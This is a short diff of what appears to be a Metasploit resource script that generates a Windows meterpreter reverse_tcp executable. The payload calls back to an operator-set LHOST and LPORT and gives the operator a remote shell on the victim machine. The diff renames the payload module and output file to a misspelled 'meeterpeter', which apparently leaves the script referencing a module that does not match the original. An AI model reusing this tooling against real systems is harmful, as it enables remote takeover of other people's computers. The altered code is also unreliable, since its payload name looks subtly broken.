@@ -1,5 +1,5 @@
 <ruby>
-PAYLOAD = 'windows/meterpreter/reverse_tcp'
+PAYLOAD = 'windows/meeterpeter/reverse_tcp'
 
 def payload_lhost
   framework.datastore['LHOST'] || Rex::Socket.source_address
@@ -10,7 +10,7 @@ def payload_lport
 end
 
 def out_path
-  "#{Msf::Config::local_directory}/meterpreter_reverse_tcp.exe"
+  "#{Msf::Config::local_directory}/meeterpeter_reverse_tcp.exe"
 end
 
 run_single("use payload/#{PAYLOAD}")
